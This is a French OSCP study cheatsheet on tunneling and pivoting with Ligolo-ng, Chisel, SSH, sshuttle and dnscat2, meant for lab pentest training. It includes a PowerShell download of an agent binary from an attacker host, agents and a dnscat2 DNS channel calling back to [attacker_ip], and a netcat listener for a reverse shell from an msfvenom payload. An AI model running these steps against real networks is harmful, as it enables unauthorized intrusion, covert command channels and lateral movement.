---
title: "OSCP · Tunneling"
description: "Référence des outils de tunnel et des modes de transport réseau."
---

# OSCP · Tunneling

Référence des outils de tunnel et des modes de transport réseau.


### Tunnel simple

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)


**Paramètres et repères :**
`X.X.X.X` · `Y.Y.Y.Y` · `X.X.X.X/` · `255.255.255.0`  
`/24`  


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up

```


<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>

```bash
# -selfcert génère un certificat TLS autosigné. Le tunnel reste chiffré, mais il faut vérifier l'identité du serveur.
./ligolo_proxy_linux -selfcert
# Autre possibilité
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>

```


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Tunnel simple ».</p>

```powershell
# Le port est le port par défaut, nous pourrions également le modifier si nécessaire.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
# Autre possibilité
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert

```


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Exécutez cette commande dans un autre terminal que depuis celui où le proxy ligolo est exécuté
sudo ip route add [internal_submask]/24 dev ligolo

# Vérifier la table de routage
ip route list

```


<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>

```bash
# Exécutez ces commandes dans le terminal proxy ligolo
» session
» start

# Après cela, le tunnel devrait être prêt, vous pourriez exécuter n'importe quelle commande.

```



#### Vérifier le routage avant un tunnel

Contrôler la route réellement choisie pour joindre une adresse du laboratoire.

<p class="oscp-command-note">Vérifier le routage avant un tunnel.</p>

```bash
ip route get <IP_CIBLE>
ss -ltnp
```

#### Saut SSH (ProxyJump)

Rejoindre un serveur final à travers un hôte SSH intermédiaire autorisé.

<p class="oscp-command-note">Saut SSH (ProxyJump).</p>

```bash
ssh -J <UTILISATEUR_PIVOT>@<IP_PIVOT> <UTILISATEUR_CIBLE>@<IP_CIBLE>
```

### Double tunnel

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo_double

sudo ip link set ligolo_double up

```


<p class="oscp-command-note">Script shell dans la rubrique « Double tunnel ».</p>

```bash
# La prochaine étape est d'ajouter un auditeur sur le port 11601 à notre session Ligolo existante et de la rediriger vers notre machine.
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Vérifiez qu'il a été ajouté
listener_list

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)




```powershell
# Ensuite, nous devons exécuter l'agent sur l'hôte Windows pour se connecter au port transmis sur notre machine d'attaque
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Notre dernière étape est de changer notre session en deuxième point de pivot (Windows), de démarrer le tunnel, puis d'ajouter une route au réseau nouvellement découvert à 10.1.30.0/24.
sudo ip add route <New_Network> dev ligolo_double

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_05.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_06.png)


### Redirection locale de ports (Local Port Forwarding)

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Ajoutez une IP spéciale codée en dur pour le transfert de port local.
sudo ip route add 240.0.0.1/32 dev ligolo

```


**Paramètres et repères :**
`240.0.0.1/32`  




```text
dev ligolo

```


**Paramètres et repères :**
`240.0.0.1`  


<p class="oscp-command-note">Script shell dans la rubrique « Local Redirection de ports ».</p>

```bash
┌──(kali㉿Kali)-[~]  
└─$ nmap 240.0.0.1 -sV

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
631/tcp open ipp CUPS 2.2  
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)



#### Tunnel local lié à la boucle locale

Rendre accessible un port distant depuis un port de la machine locale, sans l'exposer sur toutes les interfaces.

<p class="oscp-command-note">Tunnel local lié à la boucle locale.</p>

```bash
ssh -N -L 127.0.0.1:<PORT_LOCAL>:<IP_SERVICE>:<PORT_DISTANT> <UTILISATEUR>@<PIVOT_SSH>
```

#### Tunnel dynamique SOCKS

Créer un proxy SOCKS local pour l'acheminement d'applications compatibles.

<p class="oscp-command-note">Tunnel dynamique SOCKS.</p>

```bash
ssh -N -D 127.0.0.1:9050 <UTILISATEUR>@<PIVOT_SSH>
```

### Shells inversés depuis les réseaux internes (Reverse Shells)


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -nvlp [kali_port]

```




```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)


**Paramètres et repères :**
`msfvenom`  




```bash
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
# Autre possibilité
./payload.exe

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)


### Transfert de fichiers depuis les réseaux internes

Transférer ou récupérer des fichiers dans le laboratoire.




```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -m http.server [kali_port]

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)


## Tunnels HTTP avec Chisel

Examiner les entrées et les réponses de l'application web.


### Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In remote machine
chisel server -p <listen-port>

# In local machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>

```


### Redirection inversée de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>

# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, <LOCAL_FORWARD_PORT> avec le port de votre machine locale auquel le service distant sera transmis, <REMOTE_IP> avec l'adresse IP de la machine distante, et <REMOTE_PORT> avec le port de la machine distante.

```


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl http://localhost:<LOCAL_FORWARD_PORT>

# Le résultat est le contenu de http://<REMOTE_IP>:<REMOTE_PORT>/

```


### Proxy SOCKS dynamique

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In remote
chisel server -p <REMOTE_PORT> --socks5

# In local
chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks

# Remplacer <REMOTE_PORT> par le port du proxy SOCKS sur la machine distante, <REMOTE_IP> par l'adresse IP de la machine distante, et <LOCAL_PORT> par le port de votre machine locale où le proxy SOCKS sera disponible.

```


**Paramètres et repères :**
`/etc/proxychains.conf`  


<p class="oscp-command-note">Script shell dans la rubrique « Proxy SOCKS dynamique ».</p>

```bash
# Comment out the line of "socks4"

# /etc/proxychains.conf
...
socks5 127.0.0.1 <LOCAL_PORT>

```



#### Tester une connexion via SOCKS

Confirmer que le proxy relaie une requête en utilisant la résolution DNS côté proxy.

<p class="oscp-command-note">Tester une connexion via SOCKS.</p>

```bash
curl --socks5-hostname 127.0.0.1:9050 -I 'http://<HOTE_INTERNE>/'
```

#### Utiliser un proxy avec Nmap

Nmap derrière proxychains nécessite un scan TCP connect : certaines sondes et découvertes hôtes ne passent pas par SOCKS.

<p class="oscp-command-note">Utiliser un proxy avec Nmap.</p>

```bash
proxychains4 -q nmap -sT -Pn -n -p <PORTS> <IP_CIBLE>
```

### Proxy SOCKS inverse

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks

# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, et <REMOTE_PORT> avec le port sur la machine distante où le proxy SOCKS sera disponible.

```


**Paramètres et repères :**
`/etc/proxychains.conf`  




```bash
# /etc/proxychains.conf
...
socks5 127.0.0.1 <REMOTE_PORT>

```


<p class="oscp-command-note">Utiliser une commande au travers d&#x27;un proxy.</p>

```bash
proxychains nmap localhost

```



### Démarrer le serveur Chisel

Écouter sur le port de relais choisi ; l'authentification et le chiffrement doivent être définis selon l'environnement.

<p class="oscp-command-note">Démarrer le serveur Chisel.</p>

```bash
chisel server --reverse --port 8080
```

### Ouvrir une redirection TCP Chisel

Exposer un port cible à travers la connexion Chisel établie.

<p class="oscp-command-note">Ouvrir une redirection TCP Chisel.</p>

```bash
chisel client <IP_SERVEUR>:8080 R:<PORT_LOCAL>:127.0.0.1:<PORT_CIBLE>
```

## Tunnels DNS avec dnscat2

Interroger les enregistrements DNS et identifier les services associés.


**Paramètres et repères :**
`dnscat2`  




```bash
# Remplacer [domain] par le domaine choisi
dnscat2-server [domain]

```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Script shell dans la rubrique « Dnscat2 (DNS Tunneling) ».</p>

```bash
# Avec domaine
./dnscat --secret=[secret] [domain]

# Directly to server
./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]

```


**Paramètres et repères :**
`dnscat2`  




```bash
dnscat2> windows
dnscat2> window -i [session_id]

```


**Paramètres et repères :**
`dnscat2`  




```bash
command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]

```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Parcourir un partage SMB.</p>

```bash
# Exemple de commande
smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]

```


## Pivot réseau : Ligolo-ng et sshuttle

Ligolo-ng relaie le trafic via une interface TUN, tandis que sshuttle route certains flux par SSH. Limiter les routes aux sous-réseaux autorisés et vérifier les paramètres de la version installée.

### Créer une interface TUN

Configurer l'interface locale qui recevra les paquets destinés au réseau distant.

<p class="oscp-command-note">Créer une interface TUN.</p>

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
```

### Démarrer le proxy Ligolo-ng

Le proxy écoute les connexions de l'agent. Un certificat autosigné reste approprié au laboratoire si son empreinte est vérifiée.

<p class="oscp-command-note">Démarrer le proxy Ligolo-ng.</p>

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Connecter l'agent par empreinte

Employer une empreinte SHA-256 vérifiée plutôt que désactiver entièrement la validation TLS.

<p class="oscp-command-note">Connecter l'agent par empreinte.</p>

```bash
./agent -connect <IP_PROXY>:11601 -accept-fingerprint <EMPREINTE_SHA256>
```

### Démarrer le tunnel dans la console proxy

Sélectionner la session appropriée, puis attacher le tunnel à l'interface TUN configurée.

<p class="oscp-command-note">Démarrer le tunnel dans la console proxy.</p>

```text
tunnel_start --tun ligolo
```

### Ajouter une route vers le réseau d'audit

Router uniquement la plage IP requise à travers l'interface ligolo.

<p class="oscp-command-note">Ajouter une route vers le réseau d'audit.</p>

```bash
sudo ip route add <RESEAU_CIBLE_CIDR> dev ligolo
```

### Route réseau avec sshuttle

L'accès SSH au pivot doit être opérationnel avant de créer ce routage.

<p class="oscp-command-note">Route réseau avec sshuttle.</p>

```bash
sshuttle -r <UTILISATEUR>@<PIVOT_SSH> <RESEAU_CIBLE_CIDR>
```

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md). Synthèse rédigée pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
